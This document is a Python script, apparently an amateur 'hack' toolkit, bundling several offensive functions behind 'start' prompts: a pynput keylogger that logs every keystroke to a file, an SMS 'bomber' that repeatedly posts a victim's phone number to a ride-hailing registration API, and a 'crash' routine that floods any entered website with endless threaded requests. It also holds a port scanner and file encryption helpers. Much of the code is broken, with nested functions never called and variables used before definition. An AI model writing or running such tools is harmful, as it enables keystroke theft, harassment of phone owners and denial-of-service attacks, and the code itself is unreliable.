class hack:
    import time
    print('>>> ...')
    time.sleep(1)
    print('>>> ....')
    time.sleep(1)
    print('>>> .....')
    time.sleep(1)
    print('>>> ......')
    time.sleep(10)
    print('>>> smpw hack done')
def pip_install():
    import os
    a = input('       ')
    if a == 'start':
        os.system('python.exe -m pip install --upgrade pip')
        os.system('pip install pynput')
        os.system('pip install setuptools')
        os.system('pip install colored')
        os.system('pip install termcolor')
        os.system('pip install requests')
        os.system('pip install colorama')
        os.system('pip install pyAesCrypt')
        os.system('pip install pygame')
        a = input('       ')
        if a == 'stop':
            exit()
    def ttbb():
        import os
        a = input('       ')
        while True:
            if a == 'start':
                from pynput.keyboard import Listener
                import logging as log
                log.basicConfig(
                    filename = 'клавература.txt',
                    level = log.DEBUG,
                    format = '%(asctime)s - %(message)s'
                )
                def onPressed(key):
                    log.info(str(key))
                                
                with Listener(on_press = onPressed) as listener:
                    listener.join()
            if a == 'stop':
                exit()
    def sh_win():
        import os
        a = input('       ')
        while True:
            if a == 'start':
                os.system('shutdown -i')
                a = input('       ')
            if a == 'stop':
                exit()
    def bomber():
        import os
        a = input('       ')
        while True:
            if a == 'start':
                import requests, random, datetime, sys, time, argparse
                from colorama import Fore, Back, Style
                _phone = input('phone (79xxxxxxxxx)--->> ')
                if _phone[0] == '+':
                    _phone = _phone[1:]
                if _phone[0] == '8':
                        _phone = '7'+_phone[1:]
                if _phone[0] == '9':
                    	_phone = '7'+_phone
                _name = 'приложения'
                for x in range(12):
                        _name = _name + random.choice(list('youtube ваш код 6784'))
                        password = _name + random.choice(list('yandex ваш код 9685'))
                        username = _name + random.choice(list('google ваш код 1937'))
                _phone9 = _phone[1:]
                _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
                _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
                _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
                _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
                _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
                iteration = 0
                while True:
                        _email = _name+f'{iteration}'+'@gmail.com'
                        email = _name+f'{iteration}'+'@gmail.com'
                        try:
                    	    requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                    	    print('the message is sent!')
                        except:
                    	    print('the message is Not sent!')
                        try:
                    	    iteration += 1
                    		
                        except:
                    	    break
    def cmd():
        import os
        a = input('       ')
        if a == "start":
            os.startfile('cmd')
    def port():
        import os
        if a == "port":
            a = input('       ')
            while True:
                if a == 'start':
                    # -*- coding:utf -8 -*-
                    from termcolor import colored
                    import socket
                    def fanc1():
                        color_a = colored("[+] ", 'green')
                        print("~"*50)
                        host = input(color_a + "Host --> ")
                        port = int(input(color_a + "Port --> "))
                        print("~"*50)
                        scan = socket.socket()
                        color_b = colored("[!] ", 'red')
                        color_c = colored("[!] ", 'yellow')
                        try:
                            scan.connect((host, port))
                        except socket.error:
                            print(color_b + "Port -- ", port, " -- [CLOSED]")
                        else:
                            print(color_c + "Port -- ", port, " -- [OPEN]")
                    def fanc2():
                        color_a = colored("[+] ", 'green')
                        color_b = colored("[!] ", 'red')
                        color_c = colored("[!] ", 'yellow')
                        host = input(color_a + "Host --> ")
                        print("\n")
                        port = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20, 21, 22, 23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41, 42, 43, 53, 67, 69, 80]
                        for i in port:
                            try:
                                scan = socket.socket()
                                scan.settimeout(0.5)
                                scan.connect((host, i))
                            except socket.error:
                                print(color_b + "Port -- ", i, " -- [CLOSED]")
                            else:
                                print(color_c + "Port -- ", i, " -- [OPEN]")
                    print("~"*50)
                    print("\t[1] --- scan 1 port")
                    print("\t[2] --- scan ports")
                    print("~"*50, "\n")
                    text_a = input("[scan]--> ")
                    if text_a == "1":
                        fanc1()
                    elif text_a == "2":
                        fanc2()
                    else:
                        print(colored("error!", 'red'))
                    a = input('    ')
            if a == 'stop':
                exit()
    def encrypt_the_file_txt():
        import os
        a = input('       ')
        while True:
            if a == 'start':
                import pyAesCrypt
                print("---------------------------------------------------------------")
                file=input("File name: ")
                password=input("Password: ")
                bufferSize = 64*1024
                try: 
                    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, bufferSize)
                except FileNotFoundError: 
                	print("[x] File not found!")
                except ValueError: 
                	print("[x] Password is Fasle!")
                else: 
                	print("[+] File '"+str(os.path.splitext(file)[0])+"' successfully saved!")
                finally: 
                	print("---------------------------------------------------------------")
            if a == 'stop':
                exit()
    def ZAR_encrypt_the_file_txt():
        import os
        a = input('       ')
        while True:
            if a == 'start':
                import pyAesCrypt
                print("---------------------------------------------------------------" )
                file=input("File name: ")
                password=input("Password: ")
                bufferSize = 64*1024
                try: 
                    pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
                except FileNotFoundError: 
                    print("[x] File not found!")
                else: 
                    print("[+] File '"+str(file)+".crp' successfully saved!")
                finally: 
                    print("---------------------------------------------------------------")
            if a == 'stop':
                exit()
    def crash():
        a = input('       ')
        if a == 'start':
            import threading
            import requests
            a = input('crash:')
            def website():
                while True:
                    requests.get("https://"+a)
            while True:
             threading.Thread(target=website).start()
'''class display():
    def displayset():'''
